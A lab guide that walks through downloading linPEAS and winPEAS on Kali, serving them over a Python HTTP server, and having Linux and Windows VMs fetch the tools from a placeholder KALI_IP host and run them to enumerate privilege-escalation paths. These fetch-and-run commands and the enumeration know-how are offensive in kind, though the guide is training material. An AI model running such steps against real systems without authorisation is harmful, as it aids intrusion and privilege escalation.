# Automated Enumeration Tools

Use **linPEAS on Linux** and **winPEAS on Windows** to enumerate the host from the account you are reviewing. Kali downloads and serves the files. Run the tool in your existing session on the VM. Replace placeholders such as `KALI_IP`, `LINUX_USER`, and `LINUX_IP` with your own values.

| VM operating system | File             | Shell on the VM |
| ------------------- | ---------------- | --------------- |
| Linux               | `linpeas.sh`     | Bash            |
| Windows             | `winPEASany.exe` | PowerShell      |

### 1. Download both files on Kali

Run this in your **Kali terminal**.

```bash
mkdir -p "$HOME/tools/peas"

curl -fL --retry 2 \
  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
  -o "$HOME/tools/peas/linpeas.sh"

curl -fL --retry 2 \
  https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe \
  -o "$HOME/tools/peas/winPEASany.exe"

file "$HOME/tools/peas/linpeas.sh" "$HOME/tools/peas/winPEASany.exe"
sha256sum "$HOME/tools/peas/linpeas.sh" "$HOME/tools/peas/winPEASany.exe"
```

`file` should identify a shell script and a Windows executable, respectively. Keep the SHA-256 values if you want to check that the copies on the VMs match. The `latest` URLs follow the project's most recent release. To download the same release again, use the asset link from its specific release page. The C# WinPEAS executable requires .NET Framework 4.5.2 or later according to the project README.

[PEASS-ng releases](https://github.com/peass-ng/PEASS-ng/releases) · [WinPEAS .exe documentation](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)

### 2. Serve the files from Kali

Find your Kali IP on the network shared with the VM. With an OpenVPN lab connection on `tun0`, run this on **Kali**.

```bash
ip -4 -br addr show dev tun0
```

If your VPN uses a different interface or you are using a local VM network, run `ip -4 -br addr` and choose the address the VM can reach. When you are running Kali inside UTM, use the Kali guest's address on that network.

Open a **second Kali terminal** and replace `KALI_IP` with that address.

```bash
python3 -m http.server 8000 --bind KALI_IP --directory "$HOME/tools/peas"
```

Leave the server running during the transfer. It serves the files in `$HOME/tools/peas` and prints each request. Stop it with **Ctrl+C** once both downloads are complete.

[Python HTTP server options](https://docs.python.org/3/library/http.server.html)

### 3. linPEAS on the Linux VM

#### Transfer the file

Run this in the **Linux VM's shell**. Use the same `KALI_IP` as in the server command.

```bash
mkdir -p "$HOME/peas"

curl -fL "http://KALI_IP:8000/linpeas.sh" -o "$HOME/peas/linpeas.sh"
```

If the VM has `wget`, you can use it for the download in place of `curl`.

```bash
mkdir -p "$HOME/peas"

wget "http://KALI_IP:8000/linpeas.sh" -O "$HOME/peas/linpeas.sh"
```

**Alternative with SSH.** If you already have SSH access, run this from **Kali**. It uses the same destination as the HTTP method. For a nonstandard port, use `ssh -p SSH_PORT` and `scp -P SSH_PORT`.

```bash
ssh "LINUX_USER@LINUX_IP" 'mkdir -p "$HOME/peas"' &&
  scp "$HOME/tools/peas/linpeas.sh" "LINUX_USER@LINUX_IP:peas/linpeas.sh"
```

#### Run linPEAS and save the output

Run this on the **Linux VM**. Passing the file to Bash works without setting the executable bit.

```bash
id
sha256sum "$HOME/peas/linpeas.sh"
bash "$HOME/peas/linpeas.sh" 2>&1 | tee "$HOME/peas/linpeas-output.txt"
```

Use `-h` to see the options supported by your copy. To run just the system information checks, use `-o system_information`.

```bash
bash "$HOME/peas/linpeas.sh" -h

bash "$HOME/peas/linpeas.sh" -o system_information 2>&1 |
  tee "$HOME/peas/linpeas-system-info.txt"
```

[linPEAS project and variants](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) · [Upstream option tests](https://github.com/peass-ng/PEASS-ng/blob/master/.github/workflows/CI-master_tests.yml)

### 4. winPEAS on the Windows VM

#### Transfer the file

Run this in **PowerShell on Windows**. It creates a directory under your user profile and downloads the EXE there.

```powershell
$peasDir = Join-Path $env:USERPROFILE 'peas'
New-Item -ItemType Directory -Path $peasDir -Force | Out-Null

$uri = 'http://KALI_IP:8000/winPEASany.exe'
$outFile = Join-Path $peasDir 'winPEASany.exe'
Invoke-WebRequest -UseBasicParsing -ErrorAction Stop -Uri $uri -OutFile $outFile
```

#### Run winPEAS and save the output

Run this in **PowerShell on Windows**.

```powershell
$peasDir = Join-Path $env:USERPROFILE 'peas'
$winPeas = Join-Path $peasDir 'winPEASany.exe'

whoami /all
Get-FileHash -Algorithm SHA256 -LiteralPath $winPeas

& $winPeas 2>&1 |
    Tee-Object -FilePath (Join-Path $peasDir 'winpeas-output.txt')
```

To focus on system, user, and service information, pass the check group names as arguments to the executable.

```powershell
$peasDir = Join-Path $env:USERPROFILE 'peas'
$winPeas = Join-Path $peasDir 'winPEASany.exe'

& $winPeas systeminfo userinfo servicesinfo 2>&1 |
    Tee-Object -FilePath (Join-Path $peasDir 'winpeas-system-user-services.txt')
```

[WinPEAS .exe documentation](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) · [WinPEAS check groups](https://hackerdna.com/blog/how-to-use-winpeas#run-only-the-checks-you-need)

### 5. Troubleshooting

| Symptom                                     | What to check                                                                                                                         |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| VM times out and Kali shows no HTTP request | Use Kali's reachable VPN or VM-network address. Verify the server is still running and uses the same IP and port as the download URL. |
| Kali reports that port 8000 is in use       | Choose another available port and change it in the server command and all download URLs.                                              |
| Kali receives an HTTP 404 from GitHub       | Check the file name under **Assets** on the release page. The filenames are case-sensitive.                                           |
| The Kali server logs a 404                  | Confirm the file exists under `$HOME/tools/peas` and that the request uses the exact case of the name.                                |
| The SHA-256 differs                         | Check that you compared the same filename and release. Download the copy again before running it.                                     |
| Windows doesn't start the EXE               | Check the file type and hash, the installed .NET Framework version, and whether endpoint protection blocked execution.                |
| The tool reports access denied on a check   | Record the identity from `id` or `whoami /all`. Some checks depend on the account's permissions.                                      |

### 6. Use the output

On Linux, look for findings about current user permissions, scheduled jobs, services and file permissions. On Windows, look for token privileges, service paths and ACLs, and scheduled task identities. Confirm relevant findings with the corresponding manual checks. Keep output files out of your GitBook repo if they contain machine-specific or sensitive data.
